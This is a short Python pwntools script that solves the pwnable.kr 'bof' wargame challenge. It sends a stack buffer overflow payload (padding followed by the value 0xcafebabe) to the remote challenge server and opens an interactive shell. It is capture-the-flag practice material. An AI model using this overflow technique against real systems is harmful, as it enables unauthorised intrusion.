#!/usr/bin/env python2

import pwn

pwn.context(arch = "i386", os = "linux")
PAYLOAD = pwn.flat('A' * (44+4+4),  0xcafebabe, '\n')
r = pwn.remote("pwnable.kr", 9000)
r.send(PAYLOAD)
r.interactive()
